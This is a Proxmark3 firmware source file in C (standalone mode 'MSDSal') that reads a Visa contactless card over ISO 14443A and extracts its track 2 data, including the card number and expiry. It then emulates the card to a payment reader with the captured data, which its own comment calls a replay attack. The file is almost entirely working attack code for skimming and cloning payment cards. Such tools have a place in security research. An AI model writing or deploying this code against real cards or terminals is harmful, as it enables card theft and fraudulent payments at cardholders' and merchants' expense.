//-----------------------------------------------------------------------------
// Salvador Mendoza (salmg.net), 2020
//
// This code is licensed to you under the terms of the GNU GPL, version 2 or,
// at your option, any later version. See the LICENSE.txt file for the text of
// the license.
//-----------------------------------------------------------------------------
// Code for reading and emulating 14a technology aka MSDSal by Salvador Mendoza
//-----------------------------------------------------------------------------
#include "standalone.h"
#include "proxmark3_arm.h"
#include "appmain.h"
#include "fpgaloader.h"
#include "util.h"
#include "dbprint.h"
#include "ticks.h"
#include "string.h"
#include "BigBuf.h"
#include "iso14443a.h"
#include "protocols.h"
#include "cmd.h"

void ModInfo(void) {
    DbpString("  HF - Reading Visa cards & Emulating a Visa MSD Transaction(ISO14443) - (Salvador Mendoza)");
}

/* This standalone implements two different modes: reading and emulating.
*
* The initial mode is reading with LED A as guide.
* In this mode, the Proxmark expects a Visa Card,
* and will act as card reader. Trying to find track 2.
*
* If the Proxmark found a track 2, it will change to emulation mode (LED C) automatically.
* During this mode the Proxmark will behave as card, emulating a Visa MSD transaction
* using the pre-saved track2 from the previous reading.
*
* It is possible to jump from mode to another by simply pressing the button.
* However, to jump from reading to emulation mode, the LED C as to be on, which
* means having a track 2 in memory.
*
* Keep pressing the button down will quit the standalone cycle.
*
* LEDs:
* LED A = in reading mode
* LED C = in emulation(a track 2 in memory) mode
* LED A + LED C = in reading mode, but you can jump back to emulation mode by pressing the button
* LED B = receiving/sending commands, activity
*
*
* Reading or emulating ISO-14443A technology is not limited to payment cards. This example
* was not only designed to make a replay attack, but to open new possibilities in the ISO-14443A
* technologies. Be brave enough to share your knowledge & inspire others. Salvador Mendoza.
*/

uint8_t ppdol [255] = {0x80, 0xA8, 0x00, 0x00, 0x02, 0x83, 0x00}; // Default GET PROCESSING

uint8_t treatPDOL(uint8_t *apdu) {                  //Generate GET PROCESSING
    uint8_t plen = 7;
    //PDOL Format: 80 A8 00 00 + (PDOL Length+2) + 83 + PDOL Length + PDOL + 00
    for (uint8_t i = 1; i <= apdu[0]; i++) {          //Magic stuff, the generation order is important
        if (apdu[i] == 0x9F && apdu[i + 1] == 0x66) {   //Terminal Transaction Qualifiers
            ppdol[plen] = 0xF6;
            ppdol[plen + 1] = 0x20;
            ppdol[plen + 2] = 0xC0;
            ppdol[plen + 3] = 0x00;
            plen += 4;
            i += 2;
        } else if (apdu[i] == 0x9F && apdu[i + 1] == 0x1A) { //Terminal Country Code
            ppdol[plen] = 0x9F;
            ppdol[plen + 1] = 0x1A;
            plen += 2;
            i += 2;
        } else if (apdu[i] == 0x5F && apdu[i + 1] == 0x2A) { //Transaction Currency Code
            ppdol[plen] = 0x5F;
            ppdol[plen + 1] = 0x2A;
            plen += 2;
            i += 2;
        } else if (apdu[i] == 0x9A) {                   //Transaction Date
            ppdol[plen] = 0x9A;
            ppdol[plen + 1] = 0x9A;
            ppdol[plen + 2] = 0x9A;
            plen += 3;
            i += 1;
        } else if (apdu[i] == 0x95) {                   //Terminal Verification Results
            ppdol[plen] = 0x95;
            ppdol[plen + 1] = 0x95;
            ppdol[plen + 2] = 0x95;
            ppdol[plen + 3] = 0x95;
            ppdol[plen + 4] = 0x95;
            plen += 5;
            i += 1;
        } else if (apdu[i] == 0x9C) {                   //Transaction Type
            ppdol[plen] = 0x9C;
            plen += 1;
            i += 1;
        } else if (apdu[i] == 0x9F && apdu[i + 1] == 0x37) { //Unpredictable Number
            ppdol[plen] = 0x9F;
            ppdol[plen + 1] = 0x37;
            ppdol[plen + 2] = 0x9F;
            ppdol[plen + 3] = 0x37;
            plen += 4;
            i += 2;
        } else {                                        //To the others, add "0" to complete the format depending on its range
            uint8_t u = apdu[i + 2];
            while (u > 0) {
                ppdol[plen] = 0;
                plen += 1;
                u--;
            }
            i += 2;
        }
    }
    ppdol[4] = (plen + 2) - 7;                        // Length of PDOL + 2
    ppdol[6] = plen - 7;                              // Real length
    plen++;                                           // +1 because the last 0
    ppdol[plen] = 0x00;                               // Add the last 0 to the challenge
    return plen;
}

void RunMod() {
    StandAloneMode();
    Dbprintf(_YELLOW_(">>")  "Reading Visa cards & Emulating a Visa MSD Transaction a.k.a. MSDSal Started<<");
    FpgaDownloadAndGo(FPGA_BITSTREAM_HF);

    //For reading process
    iso14a_card_select_t card_a_info;
    uint8_t apdubuffer[MAX_FRAME_SIZE] = { 0x00 };

    //Specific for Visa cards: select ppse, select Visa AID, GET PROCESSING, SFI
    uint8_t ppse[20] = {0x00, 0xA4, 0x04, 0x00, 0x0e, 0x32, 0x50, 0x41, 0x59, 0x2e, 0x53, 0x59, 0x53, 0x2e, 0x44, 0x44, 0x46, 0x30, 0x31, 0x00};
    uint8_t visa[13] = {0x00, 0xA4, 0x04, 0x00, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0x00};
    uint8_t processing [8] = {0x80, 0xA8, 0x00, 0x00, 0x02, 0x83, 0x00, 0x00};
    uint8_t sfi[5] = {0x00, 0xb2, 0x01, 0x0c, 0x00};

    uint8_t *apdus[4] = {ppse, visa, processing, sfi};
    uint8_t apdusLen [4] = { sizeof(ppse), sizeof(visa), sizeof(processing), sizeof(sfi)};

    uint8_t pdol[50], plen = 8;

    bool existpdol;


    // - MSD token card format -
    //
    //Card number: 4412 3456 0578 1234
    //Expiration date: 17/11
    //Service code: 201
    //Discretionary data: 0000030000991
    //char token[19] = {0x44,0x12,0x34,0x56,0x05,0x78,0x12,0x34,0xd1,0x71,0x12,0x01,0x00,0x00,0x03,0x00,0x00,0x99,0x1f};
    //
    // It is possible to initialize directly the emulation mode, having "token" with data and set "chktoken" = true ;)
    //
    char token[19] = {0x00};
    bool chktoken = false;

//For emulation steps
#define ATQA      0
#define UIDC1     1
#define SAKC1     3
#define RATS      5
#define SIGNATURE 7

// Allocate 512 bytes for the dynamic modulation, created when the reader queries for it
// Such a response is less time critical, so we can prepare them on the fly
#define DYNAMIC_RESPONSE_BUFFER_SIZE 64
#define DYNAMIC_MODULATION_BUFFER_SIZE 512

    uint8_t flags = FLAG_4B_UID_IN_DATA; //UID 4 bytes(could be 7 bytes if needed it)
    uint8_t data[PM3_CMD_DATA_SIZE] = {0x00}; // in case there is a read command received we shouldn't break

    uint8_t visauid[7] = {0x01, 0x02, 0x03, 0x04};
    memcpy(data, visauid, 4);

    // to initialize the emulation
    uint8_t tagType = 4; // 4 = ISO/IEC 14443-4 - javacard (JCOP)
    tag_response_info_t *responses;
    uint32_t cuid = 0;
    uint32_t counters[3] = { 0x00, 0x00, 0x00 };
    uint8_t tearings[3] = { 0xbd, 0xbd, 0xbd };
    uint8_t pages = 0;

    // command buffers
    uint8_t receivedCmd[MAX_FRAME_SIZE] = { 0x00 };
    uint8_t receivedCmdPar[MAX_PARITY_SIZE] = { 0x00 };

    uint8_t dynamic_response_buffer[DYNAMIC_RESPONSE_BUFFER_SIZE];
    uint8_t dynamic_modulation_buffer[DYNAMIC_MODULATION_BUFFER_SIZE];

    // to know the transaction status
    uint8_t prevCmd = 0;

    // handler - command responses
    tag_response_info_t dynamic_response_info = {
        .response = dynamic_response_buffer,
        .response_n = 0,
        .modulation = dynamic_modulation_buffer,
        .modulation_n = 0
    };

// States for standalone
#define STATE_READ 0
#define STATE_EMU  1

    uint8_t state = STATE_READ;

    //Checking if the user wants to go directly to emulation mode using a hardcoded track 2
    if (chktoken == true && token[0] != 0x00) {
        state = STATE_EMU;
        Dbprintf(_YELLOW_("[") "Initialized emulation mode " _YELLOW_("]"));
        DbpString("\n"_YELLOW_("!!") "Waiting for a card reader...");
    } else {
        DbpString(_YELLOW_("[") "Initialized reading mode " _YELLOW_("]"));
        DbpString("\n"_YELLOW_("!!") "Waiting for a Visa card...");
    }

    for (;;) {
        WDT_HIT();

        // exit from RunMod, send a usbcommand.
        if (data_available()) break;

        // Was our button held down or pressed?
        int button_pressed = BUTTON_HELD(1000);

        if (button_pressed  == 1)        //Holding down the button
            break;
        else if (button_pressed == -1) { //Pressing one time change between reading & emulation
            if (state == STATE_READ) {
                if (chktoken == true && token[0] != 0x00) {  //Only change to emulation if it saved a track 2 in memory
                    state = STATE_EMU;
                    Dbprintf(_YELLOW_("[") "In emulation mode " _YELLOW_("]"));
                } else
                    Dbprintf(_YELLOW_("!!") "Nothing in memory to emulate");
            } else {
                state = STATE_READ;
                Dbprintf(_YELLOW_("[") "In reading mode " _YELLOW_("]"));
            }
        }

        SpinDelay(500);

        if (state == STATE_READ) {
            LED_A_ON();
            if (chktoken)
                LED_C_ON();

            iso14443a_setup(FPGA_HF_ISO14443A_READER_MOD);

            if (iso14443a_select_card(NULL, &card_a_info, NULL, true, 0, false)) {

                Dbprintf(_YELLOW_("+") "Found ISO 14443 Type A!");

                for (uint8_t i = 0; i < 4; i++) {
                    chktoken = false;
                    LED_C_OFF();
                    LED_B_ON();
                    uint8_t apdulen = iso14_apdu(apdus[i], (uint16_t) apdusLen[i], false, apdubuffer, NULL);

                    if (apdulen > 0) {
                        Dbprintf(_YELLOW_("[") "Proxmark command " _YELLOW_("]"));
                        Dbhexdump(apdusLen[i], apdus[i], false);
                        Dbprintf(_GREEN_("[") "Card answer " _GREEN_("]"));
                        Dbhexdump(apdulen - 2, apdubuffer, false);
                        Dbprintf("----");

                        for (uint8_t u = 0; u < apdulen; u++) {
                            if (i == 1) {
                                if (apdubuffer[u] == 0x9F && apdubuffer[u + 1] == 0x38) {             //Check for PDOL
                                    for (uint8_t e = 0; e <= apdubuffer[u + 2]; e++)
                                        pdol[e] =  apdubuffer[u + e + 2];

                                    plen = treatPDOL(pdol);                                             //Generate a challenge
                                    apdus[2] = ppdol;
                                    apdusLen[2] = plen;
                                    existpdol = true;
                                }
                            } else if (i == 3) {
                                if (apdubuffer[u] == 0x57 && apdubuffer[u + 1] == 0x13 && !chktoken) { //Find track 2
                                    chktoken = true;
                                    memcpy(&token, &apdubuffer[u + 2], 19);
                                    break;
                                }
                            }
                        }

                        if (i == 1) {
                            Dbprintf(_GREEN_("[") "Challenge generated " _GREEN_("]"));
                            Dbhexdump(plen, existpdol ? ppdol : processing, false);
                        }
                    } else {
                        Dbprintf(_YELLOW_("!!") "Error reading the card");
                    }
                    LED_B_OFF();
                }

                if (chktoken) {
                    Dbprintf(_RED_("[") "Track 2 " _RED_("]"));
                    Dbhexdump(19, (uint8_t *)token, false);
                    Dbprintf(_YELLOW_("!!") "Card number");
                    Dbhexdump(8, (uint8_t *)token, false);
                    DbpString("---");
                    LED_C_ON();
                    state = STATE_EMU;
                    Dbprintf(_YELLOW_("[") "Initialized emulation mode " _YELLOW_("]"));
                    DbpString("\n"_YELLOW_("!!") "Waiting for a card reader...");
                }
            }
        } else if (state == STATE_EMU) {
            LED_A_OFF();
            LED_C_ON();

            // free eventually allocated BigBuf memory but keep Emulator Memory
            BigBuf_free_keep_EM();

            if (SimulateIso14443aInit(tagType, flags, data, &responses, &cuid, counters, tearings, &pages) == false) {
                BigBuf_free_keep_EM();
                reply_ng(CMD_HF_MIFARE_SIMULATE, PM3_EINIT, NULL, 0);
                DbpString(_YELLOW_("!!") "Error initializing the emulation process!");
                SpinDelay(500);
                state = STATE_READ;
                DbpString(_YELLOW_("[") "Initialized reading mode " _YELLOW_("]"));
                DbpString("\n" _YELLOW_("!!") "Waiting for a Visa card...");
                break;
            }

            // We need to listen to the high-frequency, peak-detected path.
            iso14443a_setup(FPGA_HF_ISO14443A_TAGSIM_LISTEN);

            int len = 0;              // command length
            int retval = PM3_SUCCESS; // to check emulation status

            clear_trace();
            set_tracing(true);

            for (;;) {
                LED_B_OFF();
                // Clean receive command buffer
                if (!GetIso14443aCommandFromReader(receivedCmd, receivedCmdPar, &len)) {
                    Dbprintf(_YELLOW_("!!") "Emulator stopped");
                    retval = PM3_EOPABORTED;
                    break;
                }
                tag_response_info_t *p_response = NULL;
                LED_B_ON();

                // dynamic_response_info will be in charge of responses
                dynamic_response_info.response_n = 0;

                // Checking the commands order is important and elemental
                if (receivedCmd[0] == ISO14443A_CMD_REQA && len == 1) {         // Received a REQUEST
                    DbpString(_YELLOW_("+") "REQUEST Received");
                    p_response = &responses[ATQA];
                } else if (receivedCmd[0] == ISO14443A_CMD_HALT && len == 4) {  // Received a HALT
                    DbpString(_YELLOW_("+") "Received a HALT");
                    p_response = NULL;
                } else if (receivedCmd[0] == ISO14443A_CMD_WUPA && len == 1) {  // Received a WAKEUP //Este!!
                    DbpString(_YELLOW_("+") "WAKEUP Received");
                    p_response = &responses[ATQA];
                    prevCmd = 0;
                } else if (receivedCmd[1] == 0x20 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT && len == 2) {  // Received request for UID (cascade 1)
                    DbpString(_YELLOW_("+") "Request for UID C1");
                    p_response = &responses[UIDC1];
                } else if (receivedCmd[1] == 0x70 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT && len == 9) {  // Received a SELECT (cascade 1)
                    DbpString(_YELLOW_("+") "Request for SELECT S1");
                    p_response = &responses[SAKC1];
                } else if (receivedCmd[0] == ISO14443A_CMD_RATS && len == 4) {  // Received a RATS request
                    DbpString(_YELLOW_("+") "Request for RATS");
                    p_response = &responses[RATS];
                } else {
                    Dbprintf(_YELLOW_("[") "Card reader command " _YELLOW_("]"));
                    Dbhexdump(len, receivedCmd, false);

                    if (receivedCmd[0] == 0x02 || receivedCmd[0] == 0x03) { //Emulate a Visa MSD(Magnetic stripe data) card
                        dynamic_response_info.response[0] = receivedCmd[0];

                        //Depending on card reader commands, the Proxmark will answer to fool the reader
                        if (receivedCmd[2] == 0xA4 && receivedCmd[6] == 0x32 && prevCmd == 0) {                                 //Respond with PPSE
                            uint8_t ppsea[39] = {0x6F, 0x23, 0x84, 0x0E, 0x32, 0x50, 0x41, 0x59, 0x2E, 0x53, 0x59, 0x53, 0x2E, 0x44, 0x44, 0x46, 0x30, 0x31, 0xA5, 0x11, 0xBF, 0x0C, 0x0E, 0x61, 0x0C, 0x4F, 0x07, 0xA0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0x87, 0x01, 0x01, 0x90, 0x00};
                            memcpy(&dynamic_response_info.response[1], ppsea, sizeof(ppsea));
                            dynamic_response_info.response_n = sizeof(ppsea) + 1;
                            prevCmd++;
                        } else if (receivedCmd[2] == 0xA4 && receivedCmd[10] == 0x03 && receivedCmd[11] == 0x10 && prevCmd == 1) { //Respond Visa AID
                            uint8_t visauid_long[34] = {0x6F, 0x1E, 0x84, 0x07, 0xA0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0xA5, 0x13, 0x50, 0x0B, 0x56, 0x49, 0x53, 0x41, 0x20, 0x43, 0x52, 0x45, 0x44, 0x49, 0x54, 0x9F, 0x38, 0x03, 0x9F, 0x66, 0x02, 0x90, 0x00};
                            memcpy(&dynamic_response_info.response[1], visauid_long, sizeof(visauid_long));
                            dynamic_response_info.response_n = sizeof(visauid_long) + 1;
                            prevCmd++;
                        } else if (receivedCmd[1] == 0x80 && receivedCmd[2] == 0xA8 && receivedCmd[6] == 0x83  && prevCmd == 2) { //GET PROCESSING
                            uint8_t processing_long[10] = {0x80, 0x06, 0x00, 0x80, 0x08, 0x01, 0x01, 0x00, 0x90, 0x00};
                            memcpy(&dynamic_response_info.response[1], processing_long, sizeof(processing_long));
                            dynamic_response_info.response_n = sizeof(processing_long) + 1;
                            prevCmd++;
                        } else if (receivedCmd[1] == 0x00 && receivedCmd[2] == 0xB2  && prevCmd == 3) {                         //SFI
                            uint8_t last[4] =  {0x70, 0x15, 0x57, 0x13};
                            uint8_t statusapdu[2] = {0x90, 0x00};
                            uint8_t card[25];
                            memcpy(&card[0], last, sizeof(last));
                            memcpy(&card[4], token, sizeof(token));
                            memcpy(&card[23], statusapdu, sizeof(statusapdu));
                            memcpy(&dynamic_response_info.response[1], card, sizeof(card));
                            dynamic_response_info.response_n = sizeof(card) + 1;
                            prevCmd++;
                        } else {
                            uint8_t finished[2] = {0x6f, 0x00};
                            memcpy(&dynamic_response_info.response[1], finished, sizeof(finished));
                            dynamic_response_info.response_n = sizeof(finished) + 1;
                            if (prevCmd == 5) {
                                prevCmd = 0;
                            }
                        }
                    } else {
                        Dbprintf(_YELLOW_("!!") "Received unknown command!");
                        if (prevCmd < 4) {
                            memcpy(dynamic_response_info.response, receivedCmd, len);
                            dynamic_response_info.response_n = len;
                        } else {
                            dynamic_response_info.response_n = 0;
                        }
                    }
                }
                if (dynamic_response_info.response_n > 0) {
                    Dbprintf(_GREEN_("[") "Proxmark3 answer " _GREEN_("]"));
                    Dbhexdump(dynamic_response_info.response_n, dynamic_response_info.response, false);
                    Dbprintf("----");

                    // Add CRC bytes, always used in ISO 14443A-4 compliant cards
                    AddCrc14A(dynamic_response_info.response, dynamic_response_info.response_n);
                    dynamic_response_info.response_n += 2;

                    if (prepare_tag_modulation(&dynamic_response_info, DYNAMIC_MODULATION_BUFFER_SIZE) == false) {
                        SpinDelay(500);
                        DbpString(_YELLOW_("!!") "Error preparing Proxmark to answer!");
                        continue;
                    }
                    p_response = &dynamic_response_info;
                }

                if (p_response != NULL) {
                    EmSendPrecompiledCmd(p_response);
                }
            }
            switch_off();

            set_tracing(false);
            BigBuf_free_keep_EM();
            reply_ng(CMD_HF_MIFARE_SIMULATE, retval, NULL, 0);
        }
    }
    DbpString(_YELLOW_("[=]") "exiting");
    LEDsoff();
}
